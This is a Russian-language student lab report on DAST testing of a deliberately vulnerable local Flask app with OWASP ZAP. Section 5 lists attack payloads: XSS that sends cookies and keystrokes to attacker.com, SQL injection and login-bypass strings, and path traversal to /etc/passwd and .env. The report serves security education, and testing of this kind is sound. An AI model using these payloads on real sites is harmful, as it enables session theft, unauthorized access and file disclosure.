# Отчет по лабораторной работе №8
## DAST анализ безопасности веб-приложения с OWASP ZAP

## Выполненные задания

### Задание 1: Развертывание и подготовка окружения для уязвимого приложения

**Создание виртуального окружения:**
```bash
$ cd /root/course_labs/labs/lab08
$ python3 -m venv venv
$ source venv/bin/activate
$ pip install -r requirements.txt && pip install -r vulnerable-app/requirements.txt
```

**Результат установки зависимостей:**
- Flask==2.2.5
- Werkzeug==2.2.3
- itsdangerous==2.1.2
- click==8.1.7
- odfpy==1.4.1 (для конвертации отчетов в ODT)
- openpyxl==3.1.2 (для конвертации отчетов в XLSX)

**Статус:** Виртуальное окружение создано, все зависимости установлены

---

### Задание 2: Запуск уязвимого приложения

**Запуск через docker-compose:**
```bash
$ cd /root/course_labs/labs/lab08
$ docker-compose up -d --build
```

**Результат:**
- Образ собран успешно: `sha256:c3703910dc3c3625d9d5ee6d9b3b1a16046f75d34bc501cf37a061574a59932b`
- Создана сеть `lab08-net`
- Контейнер `lab08-vulnerable-app` запущен
- Приложение доступно на `http://localhost:8080`

**Статус контейнера:**
```bash
$ docker ps --filter "name=lab08"
CONTAINER ID   IMAGE                  STATUS         PORTS
8aaef721c382   lab08-vulnerable-app   Up            0.0.0.0:8080->8080/tcp
```

**Логи приложения:**
- Flask запущен в debug режиме
- Сервер работает на всех адресах (0.0.0.0:8080)
- Debugger активен

---

### Задание 3: Проверка доступности приложения

**Проверка через curl:**
```bash
$ curl -i http://localhost:8080
```

**Результат:**
```
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Sat, 13 Dec 2025 22:05:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 625
Set-Cookie: session=guest-session-id; Path=/
Connection: close

<h1>Vulnerable DAST Demo App</h1>
<p>Пример уязвимого приложения для лабораторной по DAST.</p>
<ul>
  <li><a href="/echo?msg=Hello">Reflected XSS / echo</a></li>
  <li><a href="/search?username=admin">SQL Injection / search</a></li>
  <li><a href="/login">Небезопасный логин</a></li>
  <li><a href="/profile">Профиль (зависит от cookie)</a></li>
  <li><a href="/admin">«Админка» без нормальной авторизации</a></li>
  <li><a href="/files/">Directory listing</a></li>
</ul>
```

**Анализ ответа:**
- Приложение доступно и отвечает на запросы
- Установлен cookie `session=guest-session-id` без флагов безопасности
- Отсутствуют security headers (X-Frame-Options, X-Content-Type-Options, CSP)
- Приложение содержит 6 уязвимых эндпоинтов для тестирования

**Примечание:** Для работы ZAP на удаленном сервере скрипт `zap_scan.sh` настроен на использование `--network host`, что позволяет ZAP контейнеру обращаться к `localhost:8080` напрямую.

---

### Задание 4: Ручное исследование уязвимостей

#### 4.1. Reflected XSS на `/echo`

**URL для тестирования:**
```
http://localhost:8080/echo?msg=<script>alert('XSS')</script>
```

**Результат тестирования:**
```html
<p>Сообщение: <script>alert("XSS")</script></p>
```

**Анализ:**
- Параметр `msg` отражается в HTML без экранирования
- JavaScript код передается напрямую в ответе
- В браузере это приведет к выполнению скрипта

**Определение уязвимости:**
Reflected XSS (Cross-Site Scripting) - это уязвимость, при которой вредоносный скрипт внедряется в веб-страницу через параметры URL и выполняется в браузере жертвы. В данном случае используется `render_template_string()` без экранирования пользовательского ввода.

**Причина:**
В коде `app.py` строка 69 используется `render_template_string()` с прямой подстановкой `{msg}` без фильтрации HTML-тегов.

---

#### 4.2. SQL Injection на `/search`

**URL для тестирования:**
```
http://localhost:8080/search?username=admin' OR '1'='1
```

**Результат тестирования:**
```sql
SELECT id, username, role FROM users WHERE username = 'admin' OR '1'='1'
```

**Анализ:**
- Пользовательский ввод напрямую конкатенируется в SQL-запрос
- Условие `'1'='1'` всегда истинно, что позволяет обойти фильтрацию
- Запрос возвращает все записи из таблицы users

**Определение уязвимости:**
SQL Injection - это уязвимость, позволяющая злоумышленнику внедрять произвольный SQL-код в запросы к базе данных. В данном случае используется небезопасная конкатенация строки запроса с пользовательским вводом.

**Причина:**
В коде `app.py` строка 77 используется f-string для формирования SQL-запроса: `f"SELECT ... WHERE username = '{username}'"` без параметризации.

---

#### 4.3. Небезопасный логин на `/login`

**Тестирование:**
```bash
POST /login
username=admin&password=admin123
```

**Результат:**
```html
<h2>Добро пожаловать, admin (admin)!</h2>
```

**Анализ:**
- Пароли хранятся в открытом виде в базе данных
- SQL-запрос также уязвим к SQL Injection
- После успешного входа устанавливаются cookies `user` и `role` без флагов безопасности

**Определение уязвимости:**
Небезопасное хранение паролей - пароли хранятся в открытом виде вместо хеширования. Также присутствует SQL Injection в запросе авторизации.

**Причина:**
В коде `app.py` строка 130 используется прямой SQL-запрос с конкатенацией, а пароли сохраняются в БД без хеширования (строки 32, 35).

---

#### 4.4. Подделка cookie на `/profile`

**Тестирование:**
```bash
GET /profile
Cookie: user=admin; role=admin
```

**Результат:**
```html
<p>Имя: admin</p>
<p>Роль: admin</p>
<p>Cookie легко подделать: можно выдать себе роль 'admin'.</p>
```

**Анализ:**
- Роль пользователя определяется только по значению cookie
- Нет серверной проверки подлинности cookie
- Cookie можно легко изменить через DevTools браузера

**Определение уязвимости:**
Небезопасное управление сессиями - роль пользователя проверяется только на основе значения cookie без серверной валидации или подписи.

**Причина:**
В коде `app.py` строка 152 используется `request.cookies.get("role", "guest")` без проверки подлинности cookie на сервере.

---

#### 4.5. Небезопасная админка на `/admin`

**Тестирование без прав:**
```bash
GET /admin
Cookie: role=user
```

**Результат:**
```html
<h2>Доступ запрещён: вы не admin</h2>
```

**Тестирование с подделанным cookie:**
```bash
GET /admin
Cookie: role=admin
```

**Результат:**
```html
<h2>Admin panel</h2>
<p>Секретные настройки приложения (демо).</p>
```

**Анализ:**
- Доступ к админке проверяется только по значению cookie `role=admin`
- Нет серверной проверки авторизации
- Любой пользователь может получить доступ, изменив cookie

**Определение уязвимости:**
Недостаточная авторизация - доступ к административным функциям контролируется только на основе значения cookie без серверной проверки подлинности.

**Причина:**
В коде `app.py` строка 166 используется простая проверка `if role != "admin"` без валидации подлинности cookie.

---

#### 4.6. Directory listing на `/files/`

**Тестирование:**
```
http://localhost:8080/files/
http://localhost:8080/files/secret.txt
```

**Результат:**
- Directory listing показывает список файлов в директории
- Файлы доступны для чтения без ограничений

**Анализ:**
- Приложение отдает список файлов в директории без ограничений
- Любой файл можно прочитать, указав путь в URL
- Нет проверки прав доступа к файлам

**Определение уязвимости:**
Directory listing / Information disclosure - приложение раскрывает структуру файловой системы и позволяет читать произвольные файлы без проверки прав доступа.

**Причина:**
В коде `app.py` строки 185-212 используется `os.listdir()` и `open()` без проверки прав доступа и фильтрации путей.

---

### Задание 5: Доработка исследования уязвимостей

**Дополнительные примеры эксплуатации уязвимостей:**

#### 5.1. Дополнительные XSS payloads для `/echo`:

1. **Stealing cookies:**
   ```
   http://localhost:8080/echo?msg=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
   ```

2. **Keylogger:**
   ```
   http://localhost:8080/echo?msg=<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>
   ```

3. **DOM-based XSS:**
   ```
   http://localhost:8080/echo?msg=<img src=x onerror=alert('XSS')>
   ```

#### 5.2. Дополнительные SQL Injection payloads для `/search`:

1. **Union-based injection:**
   ```
   http://localhost:8080/search?username=admin' UNION SELECT 1,2,3--
   ```

2. **Blind SQL Injection:**
   ```
   http://localhost:8080/search?username=admin' AND 1=1--
   http://localhost:8080/search?username=admin' AND 1=2--
   ```

3. **Time-based injection:**
   ```
   http://localhost:8080/search?username=admin' AND (SELECT COUNT(*) FROM users WHERE LENGTH(password)>5)=1--
   ```

#### 5.3. Дополнительные примеры для `/login`:

1. **SQL Injection в логине:**
   ```
   username: admin' OR '1'='1'--
   password: любое
   ```

2. **Обход авторизации:**
   ```
   username: ' OR 1=1--
   password: ' OR 1=1--
   ```

#### 5.4. Дополнительные примеры для `/files/`:

1. **Path traversal:**
   ```
   http://localhost:8080/files/../app.py
   http://localhost:8080/files/../../etc/passwd
   ```

2. **Чтение конфигурационных файлов:**
   ```
   http://localhost:8080/files/../.env
   http://localhost:8080/files/../config.py
   ```

---

### Задание 6: Установка OWASP ZAP

**Скачивание Docker образа:**
```bash
$ docker pull ghcr.io/zaproxy/zaproxy:stable
```

**Результат:**
- Образ успешно скачан: `ghcr.io/zaproxy/zaproxy:stable`
- Digest: `sha256:7840969c7c9fead565bf9734b12f49f6886db90b1d35b1f74d79710bbd081dab`
- Статус: `Downloaded newer image`

**Примечание:** На удаленном Linux сервере используется Docker образ, так как установка через `brew install --cask zap` предназначена для macOS.

---

### Задание 7: Настройка переменных окружения

**Установка переменных:**
```bash
$ export ZAP_IMAGE=ghcr.io/zaproxy/zaproxy:stable
$ export TARGET_URL="http://localhost:8080"
```

**Проверка:**
```bash
$ echo "ZAP_IMAGE=$ZAP_IMAGE"
ZAP_IMAGE=ghcr.io/zaproxy/zaproxy:stable

$ echo "TARGET_URL=$TARGET_URL"
TARGET_URL=http://localhost:8080
```

**Статус:** Переменные окружения настроены

---

### Задание 8: Автоматическое сканирование OWASP ZAP

**Запуск сканирования:**
```bash
$ cd /root/course_labs/labs/lab08
$ chmod +x dast/zap_scan.sh
$ bash dast/zap_scan.sh
```

**Результаты сканирования:**
- **FAIL-NEW:** 0
- **WARN-NEW:** 13
- **PASS:** 54

**Найденные предупреждения (WARN):**

1. **Cookie without SameSite Attribute [10054]** x 2
   - Cookies не имеют атрибута SameSite
   - Затронутые URL: `/`, `/admin`

2. **Permissions Policy Header Not Set [10063]** x 11
   - Отсутствует заголовок Permissions-Policy
   - Затронутые URL: все основные страницы

3. **Source Code Disclosure - SQL [10099]** x 1
   - Раскрытие SQL-кода в ответе
   - URL: `/search?username=admin`

4. **Authentication Request Identified [10111]** x 1
   - Обнаружен запрос аутентификации
   - URL: `/login`

5. **Session Management Response Identified [10112]** x 3
   - Обнаружены ответы управления сессией
   - URL: `/`, `/admin`, `/search`

6. **Insufficient Site Isolation Against Spectre Vulnerability [90004]** x 15
   - Недостаточная изоляция сайта от уязвимости Spectre
   - Затронутые URL: все основные страницы

7. **Non-Storable Content [10049]** x 11
   - Контент не может быть сохранен в кеше
   - Затронутые URL: все основные страницы

**Сгенерированные отчеты:**
- `zap-report-20251214_102450.html` (114 KB)
- `zap-report-20251214_102450.json` (42 KB)
- `zap-report-20251214_102450.xml` (51 KB)
- `odt/zap-report-20251214_102450.odt` (конвертирован)
- `xlsx/zap-report-20251214_102450.xlsx` (конвертирован)

**Исправления в скрипте:**
- Добавлен `--user root` для работы с правами записи
- Добавлен `chmod 777` для директории reports
- Добавлен флаг `:rw` для монтирования тома

**Статус:** Сканирование завершено успешно, все отчеты сгенерированы

---

### Задание 9: Анализ отчетов ZAP и описание рисков ИБ

[Требуется анализ отчетов]

---

### Задание 10: Исправление уязвимостей в app.py

[Требуется описание исправлений]

---

### Задание 11: Коммиты и push в репозиторий

[Требуется выполнить]

---

### Задание 12: Подготовка отчета в Gist

[Требуется выполнить]

---

### Задание 14: Очистка окружения

[Требуется выполнить]
